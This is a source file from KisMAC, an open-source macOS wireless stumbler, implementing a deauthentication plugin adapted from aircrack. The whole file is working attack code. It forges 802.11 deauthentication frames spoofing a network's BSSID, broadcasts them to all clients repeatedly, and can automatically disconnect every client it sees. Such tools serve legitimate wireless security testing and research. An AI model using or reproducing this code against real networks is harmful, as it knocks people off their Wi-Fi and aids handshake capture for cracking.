/*
 
 File:			WavePluginDeauthentication.m
 Program:		KisMAC
 Author:		pr0gg3d
 Changes:       Vitalii Parovishnyk(1012-2015)
 
 Description:	KisMAC is a wireless stumbler for MacOS X.
 
 This file is part of KisMAC.
 
 Most parts of this file are based on aircrack by Christophe Devine.
 
 KisMAC is free software; you can redistribute it and/or modify
 it under the terms of the GNU General Public License, version 2,
 as published by the Free Software Foundation;
 
 KisMAC is distributed in the hope that it will be useful,
 but WITHOUT ANY WARRANTY; without even the implied warranty of
 MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 GNU General Public License for more details.
 
 You should have received a copy of the GNU General Public License
 along with KisMAC; if not, write to the Free Software
 Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
 */

#import "WavePluginDeauthentication.h"
#import "KisMAC80211.h"
#import "WaveNet.h"
#import "WaveDriver.h"
#import "WaveContainer.h"
#import "../Core/80211b.h"

@implementation WavePluginDeauthentication

- (id) initWithDriver:(WaveDriver *)driver andContainer:(WaveContainer *)container
{
    self = [super initWithDriver:driver];
    if (!self)
	{
        return nil;
    }
	
    _container = container;
    
	return self;
}

- (BOOL) startTest: (WaveNet *)net atInterval:(NSInteger)interval
{
    KFrame kframe;
    struct ieee80211_deauth *deauth = (struct ieee80211_deauth *)(kframe.data);
    
    NSInteger tmp[6];
    UInt8 x[6];
    NSUInteger i;
    
    if ([net type] != networkTypeManaged )
	{
        return NO;
    }
    // Check if we have a valid BSSID
    if(sscanf([[net BSSID] UTF8String], "%lx:%lx:%lx:%lx:%lx:%lx", &tmp[0], &tmp[1], &tmp[2], &tmp[3], &tmp[4], &tmp[5]) < 6)
	{
        return NO;
    }
	
    // zeroize frame
    memset(&kframe,0,sizeof(KFrame));
    
    // Set frame control flags
    deauth->header.frame_ctl = IEEE80211_TYPE_MGT | IEEE80211_SUBTYPE_DEAUTH;
    
    // We do global deauth (addr1 is destination)
    memcpy(deauth->header.addr1, BCAST_MACADDR, ETH_ALEN);
    
    // Set frame BSSID and source as our BSSID
    for (i=0;i<6;++i)
        x[i]=tmp[i] & 0xff;
    memcpy(deauth->header.addr2, x, 6);
    memcpy(deauth->header.addr3, x, 6);
    
    // Set deauthentication reason to ...
    deauth->reason = NSSwapHostShortToLittle(2);
    
    // Ramndomize sequence control
    deauth->header.seq_ctl = random() & 0x0FFF;
    
    kframe.ctrl.len = sizeof(struct ieee80211_deauth);
    kframe.ctrl.tx_rate = [_driver currentRate];
    
    // Done... send frame
    [_driver sendKFrame:&kframe
				howMany:-1
			 atInterval:interval];
	
    if (interval != 0)
	{
        _status = WavePluginRunning;
    }
	
    return YES;
}

- (WavePluginPacketResponse) gotPacket:(WavePacket *)packet fromDriver:(WaveDriver *)driver
{
    if (_deauthing && [packet toDS])
	{
        if (![_container IDFiltered:[packet rawSenderID]] && ![_container IDFiltered:[packet rawBSSID]])
		{
            [self deauthenticateClient:[packet rawSenderID]
					inNetworkWithBSSID:[packet rawBSSID]];
        }
    }
	
    return WavePluginPacketResponseContinue; 
}

- (void) setDeauthingAll:(BOOL)deauthing
{
    DBNSLog(@"DEAUTH ALL %d", deauthing);
    _deauthing = deauthing;
}

- (BOOL) deauthenticateClient:(UInt8*)client inNetworkWithBSSID:(UInt8*)bssid
{
    KFrame kframe;
    struct ieee80211_deauth *frame = (struct ieee80211_deauth *)(kframe.data);
    
	// We need to have valid client and bssid
    if (!client || !bssid)
	{
        return NO;
	}
	
    // Zeroize frame
    memset(&kframe,0,sizeof(frame));
    
    // Set frame control flags
    frame->header.frame_ctl = IEEE80211_TYPE_MGT | IEEE80211_SUBTYPE_DEAUTH;
    
    // Set destination to client
    memcpy(frame->header.addr1, client, 6);
    
    // Set frame BSSID and source as our BSSID
    memcpy(frame->header.addr2, bssid, 6);
    memcpy(frame->header.addr3, bssid, 6);
    
    // Set deauthentication reason to ...
    frame->reason = NSSwapHostShortToLittle(1);
    
    kframe.ctrl.len = sizeof(struct ieee80211_deauth);
    kframe.ctrl.tx_rate = [_driver currentRate];
    
    // Done... send frame
    [_driver sendKFrame:&kframe
				howMany:5
			 atInterval:0.05];
    
    return YES;
}

- (BOOL) stopTest
{
    BOOL stop = [super stopTest];
    if (!stop)
	{
        return NO;
	}
    
	_deauthing = FALSE;
    [_driver stopSendingFrames];
    _status = WavePluginIdle;
    
	return YES;
}

@end
